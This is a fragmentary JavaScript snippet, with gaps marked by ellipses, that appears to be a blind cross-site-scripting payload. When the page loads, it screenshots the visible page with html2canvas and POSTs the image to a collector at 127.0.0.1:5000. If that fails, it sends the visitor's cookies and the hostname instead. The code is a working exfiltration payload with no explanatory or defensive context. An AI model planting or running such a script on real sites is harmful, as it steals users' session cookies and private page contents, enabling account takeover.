...
! function () {
    ...
    function t() {
        html2canvas(document.body, {
            ...
            var t = new Image;
            t.src = canvas.toDataURL("image/jpeg");
            let n = {
            ...
            o.open("post", "http://127.0.0.1:5000/request"), o.setRequestHeader("Content-Type", "application/json"), o.send(JSON.stringify(n))
        }).catch(function () {
            let e = {
                    cookie: document.cookie,
                    hostname: window.location.hostname,
            ...
            t.open("post", "http://127.0.0.1:5000/request"), t.setRequestHeader("Content-Type", "application/json"), t.send(JSON.stringify(e))
        })
    }
    if (window.attachEvent) window.attachEvent("onload", t);
    else if (window.addEventListener) {
        window.addEventListener("load", o => {
            (new Date).getTime() - e <= 3100 && (clearInterval(n), t())
        });
